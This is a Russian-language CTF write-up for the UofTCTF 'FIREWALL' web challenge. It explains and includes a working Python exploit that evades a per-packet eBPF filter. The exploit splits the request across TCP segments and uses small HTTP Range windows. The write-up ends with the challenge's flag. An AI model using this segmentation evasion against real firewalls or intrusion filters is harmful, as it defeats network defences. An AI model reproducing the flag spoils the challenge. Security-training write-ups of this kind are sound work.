# UofTCTF — FIREWALL (Web)

## Кратко
На сервере стоит eBPF-фильтр (tc) на **ingress** и **egress**. Он дропает **любой TCP-пакет**, если в **IP payload** (TCP-заголовок + данные) встречается:

- подстрока `flag` (строго в нижнем регистре, 4 байта подряд)
- байт `%` (0x25)

Ключевая ошибка: фильтр проверяет **каждый пакет отдельно** и **не собирает TCP-поток** (не делает reassembly).

---

## WAF сложности
Обычный запрос `GET /flag.html` содержит `flag` в URI, поэтому **пакет с запросом** режется на ingress.

Даже если бы запрос прошёл, **ответ** мог бы резаться на egress, если в теле встретится `flag` (lowercase) или `%`.

---

## Идея эксплойта
### 1) Обход ingress
Разбиваем слово `flag` между **двумя TCP-сегментами**, чтобы ни в одном пакете не было байтов `f l a g` подряд.

Пример разбиения:
- пакет 1: `GET /f`
- пакет 2: `lag.html HTTP/1.1 ...`

Чтобы ОС не «склеила» отправку в один сегмент, используем:
- `TCP_NODELAY`
- маленькую `sleep` между отправками

### 2) Обход egress + получение флага
Вместо скачивания всего файла используем **HTTP Range**:

`Range: bytes=a-b` → сервер отвечает `206 Partial Content` и отдаёт только выбранные байты.

Дальше сканируем файл `flag.html` **небольшими окнами** (например по 64 байта), пока в полученных данных не найдём `uoftctf{...}`.

### 3) Стабильность соединений
Дамп «по 1 байту с новым TCP-коннектом» быстро приводит к таймаутам/ресетам (`WinError 10060/10054`), поэтому:
- делаем запросы чанками
- при `ConnectionReset/Timeout` **переподключаемся** и продолжаем

---

## Эксплойт (Python)
Задай `HOST` и `PORT` от инстанса.

```python
import socket, time, re

HOST = "ip"   
PORT = 5000         

FLAG = re.compile(br"uoftctf\{[^}]+\}", re.IGNORECASE)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(3.0)
    s.connect((HOST, PORT))
    return s

def send_split_get(s, byte_range: str, close=False, split_at=1, sleep_s=0.05):
    # split_at=1: "f" | "lag.html" (чтобы не было 'flag' подряд в одном пакете)
    path = b"flag.html"
    p1, p2 = path[:split_at], path[split_at:]
    conn = b"close" if close else b"keep-alive"

    part1 = b"GET /" + p1
    part2 = (
        p2 + b" HTTP/1.1\r\n"
        b"Host: x\r\n"
        + f"Range: bytes={byte_range}\r\n".encode()
        + b"Connection: " + conn + b"\r\n\r\n"
    )

    s.sendall(part1)
    time.sleep(sleep_s)  # повышает шанс отдельного TCP-сегмента
    s.sendall(part2)

def read_response(s):
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = s.recv(4096)
        if not chunk:
            return None
        data += chunk
    headers, rest = data.split(b"\r\n\r\n", 1)

    m = re.search(br"Content-Length:\s*(\d+)", headers, re.IGNORECASE)
    if not m:
        return None
    clen = int(m.group(1))

    body = rest
    while len(body) < clen:
        chunk = s.recv(4096)
        if not chunk:
            break
        body += chunk
    return headers, body[:clen]

def get_total_size():
    s = connect()
    send_split_get(s, "0-0", close=True)
    resp = read_response(s)
    s.close()
    if not resp:
        raise RuntimeError("Нет ответа на bytes=0-0")
    headers, _ = resp
    m = re.search(br"Content-Range:\s*bytes\s+\d+-\d+/(\d+)", headers, re.IGNORECASE)
    if not m:
        raise RuntimeError("Не найден общий размер в Content-Range")
    return int(m.group(1))

def fetch_range(a, b, tries=6):
    r = f"{a}-{b}"
    s = None
    for _ in range(tries):
        try:
            if s is None:
                s = connect()
            send_split_get(s, r, close=False, split_at=1, sleep_s=0.05)
            resp = read_response(s)
            if resp is None:
                s.close()
                s = None
                continue
            return resp[1]
        except (ConnectionResetError, TimeoutError, OSError):
            try:
                if s:
                    s.close()
            except Exception:
                pass
            s = None
            time.sleep(0.05)
    try:
        if s:
            s.close()
    except Exception:
        pass
    return None

def scan_file(total):
    out = bytearray(b"?" * total)
    step, min_step = 64, 4

    i = 0
    while i < total:
        j = min(total - 1, i + step - 1)
        body = fetch_range(i, j)

        # если диапазон «плохой» — уменьшаем окно
        if body is None or len(body) != (j - i + 1):
            if step > min_step:
                step //= 2
                continue
            i = j + 1
            step = 64
            continue

        out[i:j+1] = body

        m = FLAG.search(out)
        if m:
            return m.group(0)

        i = j + 1
        step = 64

    return None

def main():
    total = get_total_size()
    print("[*] Total size:", total)
    flag = scan_file(total)
    if flag:
        print("FLAG:", flag.decode(errors="replace"))
    else:
        print("Флаг не найден")

if __name__ == "__main__":
    main()
```

---

## Флаг
`uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`
